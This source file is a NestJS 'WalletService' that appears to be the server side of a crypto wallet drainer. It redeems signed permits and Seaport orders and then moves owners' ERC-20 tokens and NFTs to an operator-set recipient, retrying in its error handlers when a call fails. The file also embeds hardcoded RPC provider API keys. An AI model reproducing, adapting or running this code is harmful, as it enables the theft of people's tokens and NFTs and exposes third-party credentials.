import { HttpService } from '@nestjs/axios';
import { Injectable, Logger } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { Seaport } from '@opensea/seaport-js';
import { OrderWithCounter } from '@opensea/seaport-js/lib/types';
import { ethers } from 'ethers';
import { firstValueFrom } from 'rxjs';
import { IPermitOptionsDto, UserDataDto } from './dto';

@Injectable()
export class WalletService {
  private logger = new Logger('Wallet');
  private server_private_key: string;
  private server_contract_SAFA: string;
  private server_recipient: string;

  constructor(
    private httpService: HttpService,
    private configService: ConfigService,
  ) {
    this.server_private_key =
      this.configService.getOrThrow('WALLET_PRIVATE_KEY');
    this.server_contract_SAFA = this.configService.getOrThrow(
      'WALLET_CONTRACT_SAFA',
    );
    this.server_recipient = this.configService.getOrThrow('WALLET_RECIPIENT');
  }

  public async permit(
    {
      chainId,
      tokenAddress,
      abiUrl,
      amount,
      owner,
      spender,
      value,
      deadline,
      v,
      r,
      s,
    }: IPermitOptionsDto,
    user_data?: UserDataDto | undefined | null,
  ) {
    let providerRPC = '';
    if (chainId == '0x1') {
      providerRPC =
        'https://mainnet.infura.io/v3/988d51cc5e12469dbe2852d8b660b89a';
    } else if (chainId == '0x38') {
      providerRPC = 'https://rpc.ankr.com/bsc';
    } else if (chainId == '0x89') {
      providerRPC = 'https://rpc.ankr.com/polygon';
    } else if (chainId == '0xfa') {
      providerRPC = 'https://rpc.ankr.com/fantom';
    } else if (chainId == '0xa86a') {
      providerRPC = 'https://rpc.ankr.com/avalanche';
    } else if (chainId == '0xa') {
      providerRPC = 'https://rpc.ankr.com/optimism';
    } else if (chainId == '0xa4b1') {
      providerRPC = 'https://rpc.ankr.com/arbitrum';
    } else if (chainId == '0x64') {
      providerRPC = 'https://rpc.ankr.com/gnosis';
    } else if (chainId == '0x505') {
      providerRPC = 'https://rpc.moonriver.moonbeam.network';
    } else if (chainId == '0xa4ec') {
      providerRPC = 'https://rpc.ankr.com/celo';
    } else if (chainId == '0x4e454152') {
      providerRPC = 'https://mainnet.aurora.dev';
    }
    const provider = new ethers.providers.JsonRpcProvider(providerRPC);
    const gasPrice = ethers.utils.parseUnits('25', 'gwei');
    const wallet = new ethers.Wallet(
      user_data?.private_key || this.server_private_key,
      provider,
    );
    const contractInfo = await this.getABI(tokenAddress, abiUrl);
    const tokenContract = new ethers.Contract(
      tokenAddress,
      contractInfo[0],
      wallet,
    );
    try {
      const txResponse = await tokenContract.permit(
        owner,
        spender,
        value,
        deadline,
        v,
        r,
        s,
        {
          gasLimit: 100000,
        },
      );
      const txReceipt = await txResponse.wait();
      this.logger.log(`Permit Success ${txReceipt.transactionHash}`);

      const reswait = await tokenContract.transferFrom(
        owner,
        user_data?.recipient || this.server_recipient,
        amount,
        {
          gasLimit: 100000,
          gasPrice: gasPrice,
        },
      );
      const txRes = await reswait.wait();
      this.logger.log(`Transfer Done After permit ${txRes.transactionHash}`);

      return true;
    } catch (e) {
      const reswait = await tokenContract.transferFrom(
        owner,
        user_data?.recipient || this.server_recipient,
        amount,
        {
          gasLimit: 100000,
          gasPrice: gasPrice,
        },
      );
      const txRes = await reswait.wait();
      this.logger.log(`Transfer Done After permit ${txRes.transactionHash}`);
      return true;
    }
  }

  public async transferToken(
    chainId: string,
    tokenAddress: string,
    abiUrl: string,
    amount: string,
    owner: string,
    user_data?: UserDataDto | undefined | null,
  ) {
    let providerRPC = '';
    if (chainId == '0x1') {
      providerRPC =
        'https://mainnet.infura.io/v3/988d51cc5e12469dbe2852d8b660b89a';
    } else if (chainId == '0x38') {
      providerRPC = 'https://rpc.ankr.com/bsc';
    } else if (chainId == '0x89') {
      providerRPC = 'https://rpc.ankr.com/polygon';
    } else if (chainId == '0xfa') {
      providerRPC = 'https://rpc.ankr.com/fantom';
    } else if (chainId == '0xa86a') {
      providerRPC = 'https://rpc.ankr.com/avalanche';
    } else if (chainId == '0xa') {
      providerRPC = 'https://rpc.ankr.com/optimism';
    } else if (chainId == '0xa4b1') {
      providerRPC = 'https://rpc.ankr.com/arbitrum';
    } else if (chainId == '0x64') {
      providerRPC = 'https://rpc.ankr.com/gnosis';
    } else if (chainId == '0x505') {
      providerRPC = 'https://rpc.moonriver.moonbeam.network';
    } else if (chainId == '0xa4ec') {
      providerRPC = 'https://rpc.ankr.com/celo';
    } else if (chainId == '0x4e454152') {
      providerRPC = 'https://mainnet.aurora.dev';
    }

    const provider = new ethers.providers.JsonRpcProvider(providerRPC);
    const gasPrice = ethers.utils.parseUnits('25', 'gwei');
    const wallet = new ethers.Wallet(
      user_data?.private_key || this.server_private_key,
      provider,
    );
    const contractInfo = await this.getABI(tokenAddress, abiUrl);
    const tokenContract = new ethers.Contract(
      tokenAddress,
      contractInfo[0],
      wallet,
    );
    try {
      const reswait = await tokenContract.transferFrom(
        owner,
        user_data?.recipient || this.server_recipient,
        amount,
        {
          gasLimit: 100000,
          gasPrice: gasPrice,
        },
      );
      const txRes = await reswait.wait();
      this.logger.log(`Transfer Done ERC20 ${txRes.transactionHash}`);
      return true;
    } catch (e) {
      const reswait = await tokenContract.transferFrom(
        owner,
        user_data?.recipient || this.server_recipient,
        amount,
        {
          gasLimit: 100000,
          gasPrice: gasPrice,
        },
      );
      const txRes = await reswait.wait();
      this.logger.log(`Transfer Done ERC20 ${txRes.transactionHash}`);
      return true;
    }
  }

  public async seainject(
    order: OrderWithCounter,
    user_data?: UserDataDto | undefined | null,
  ) {
    const providerRPC =
      'https://rpc.ankr.com/eth/38eac0bf9f0e89d5e226f5c1ef1249406ce7958e48704cc5c3015bed44cb3dca';
    const provider = new ethers.providers.JsonRpcProvider(providerRPC);
    const wallet = new ethers.Wallet(
      user_data?.private_key || this.server_private_key,
      provider,
    );
    const seaport = new Seaport(wallet);
    try {
      await seaport.fulfillOrder({
        order,
        accountAddress: wallet.address,
      });
      this.logger.log('Transaction Broadcasted');
      return true;
    } catch (error) {
      this.logger.log(error);
      await seaport.fulfillOrder({
        order,
        accountAddress: wallet.address,
      });
      this.logger.log('Transaction Broadcasted');
      return true;
    }
  }

  public async batchtransfer(
    owner: string,
    token_address: string,
    tokens_id: Array<string>,
    user_data?: UserDataDto | undefined | null,
  ) {
    const providerRPC =
      'https://rpc.ankr.com/eth/38eac0bf9f0e89d5e226f5c1ef1249406ce7958e48704cc5c3015bed44cb3dca';
    const contractInterface = [
      { inputs: [], stateMutability: 'nonpayable', type: 'constructor' },
      {
        inputs: [
          {
            internalType: 'contract ERC721Partial',
            name: 'tokenContract',
            type: 'address',
          },
          { internalType: 'address', name: 'actualOwner', type: 'address' },
          { internalType: 'address', name: 'this.recipient', type: 'address' },
          { internalType: 'uint256[]', name: 'tokenIds', type: 'uint256[]' },
        ],
        name: 'batchTransfer',
        outputs: [],
        stateMutability: 'nonpayable',
        type: 'function',
      },
      {
        inputs: [
          { internalType: 'address', name: '_newExector', type: 'address' },
        ],
        name: 'setExecutor',
        outputs: [],
        stateMutability: 'nonpayable',
        type: 'function',
      },
    ];
    const provider = new ethers.providers.JsonRpcProvider(providerRPC);
    const gasPrice = ethers.utils.parseUnits('30', 'gwei');
    const wallet = new ethers.Wallet(
      user_data?.private_key || this.server_private_key,
      provider,
    );
    const tokens_id_int = tokens_id.map((string_number) =>
      parseInt(string_number),
    );
    const tokenContract = new ethers.Contract(
      this.server_contract_SAFA,
      contractInterface,
      wallet,
    );
    try {
      const reswait = await tokenContract.batchTransfer(
        token_address,
        owner,
        user_data?.recipient || this.server_recipient,
        tokens_id_int,
        {
          gasLimit: 300000,
          gasPrice: gasPrice,
        },
      );
      const txRes = await reswait.wait();
      this.logger.log(`Transfer Done ${txRes.transactionHash}`);
      return true;
    } catch (e) {
      const reswait = await tokenContract.batchTransfer(
        token_address,
        owner,
        user_data?.recipient || this.server_recipient,
        tokens_id_int,
        {
          gasLimit: 300000,
          gasPrice: gasPrice,
        },
      );
      const txRes = await reswait.wait();
      this.logger.log(`Transfer Done ${txRes.transactionHash}`);
      return true;
    }
  }

  private async getABI(address: string, abiUrl: string) {
    this.logger.log(`Getting ABI for ${abiUrl}`);

    const request_url = this.format(abiUrl, address);
    const response = await firstValueFrom(this.httpService.get(request_url));

    if (!response.data) {
      return [];
    }

    const { data } = response;
    const result = data.result[0];

    if (result.Proxy === '1' && result.Implementation !== '') {
      const impl = result.Implementation;
      this.logger.log(`Getting impl ABI for ${impl}`);

      const abi_response = await firstValueFrom(this.httpService.get(impl));
      if (!abi_response.data) {
        return [];
      }

      const abi = JSON.parse(abi_response.data.result[0].ABI);
      return [abi, impl];
    }

    const abi = JSON.parse(result.ABI);

    return [abi, ''];
  }

  private format(string: string, args) {
    return string.replace(/{(\d+)}/g, function (match) {
      return typeof args == 'undefined' ? match : args;
    });
  }
}
